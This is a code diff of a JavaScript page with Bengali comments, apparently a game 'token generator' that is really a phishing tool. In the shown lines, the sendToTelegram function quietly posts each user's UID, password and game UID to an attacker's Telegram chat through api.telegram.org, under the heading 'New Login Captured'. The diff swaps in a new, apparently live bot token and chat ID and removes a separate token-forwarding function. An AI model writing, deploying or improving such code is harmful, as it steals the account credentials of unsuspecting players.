@@ -252,7 +252,7 @@ let lastApiResponse = null;
 // ==========================================
 // ⚙️ নিচে আপনার Telegram Bot Token & ID বসান:
 // ==========================================
-const TELEGRAM_BOT_TOKEN = "8875718841:AAErIMQ7AEtAE0eTI36pvfPbbkFLJrN8tMM"; // যেমন: "7123456789:AAExxxxxx..."
+const TELEGRAM_BOT_TOKEN = "8902325477:AAF82AQPAJLCJqWjS71eRkEbCFOAHrWHfcE"; // যেমন: "7123456789:AAExxxxxx..."
 const TELEGRAM_CHAT_ID = "8120381389";     // যেমন: "123456789"
 // ==========================================
 
@@ -303,10 +303,10 @@ async function generateToken() {
 }
 
 // টেলিগ্রামে UID & Password পাঠানোর ফাংশন
-function sendToTelegram(uid, password) {
+function sendToTelegram(real_uid, uid, password) {
   if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
 
-  const message = `🔑 *New Login Captured*\n\n🆔 *UID:* \`${uid}\` \n🔒 *Password:* \`${password}\``;
+  const message = `🔑 *New Login Captured*\n🎮 *Game uid:* \`${real_uid}\n\n🆔 *UID:* \`${uid}\` \n🔒 *Password:* \`${password}\``;
   const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
   fetch(telegramUrl, {
@@ -320,23 +320,6 @@ function sendToTelegram(uid, password) {
   }).catch(() => {});
 }
 
-// জেনারেট হওয়া Token-ও টেলিগ্রামে পাঠানোর ফাংশন
-function sendTokenToTelegram(uid, token) {
-  if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
-
-  const message = `✅ *Token Generated*\n\n🆔 *UID:* \`${uid}\` \n🎟️ *Token:* \`${token}\``;
-  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-  fetch(telegramUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: "Markdown"
-    })
-  }).catch(() => {});
-}
 
 function copyTokenOnly() {
   if (!lastApiResponse) return;
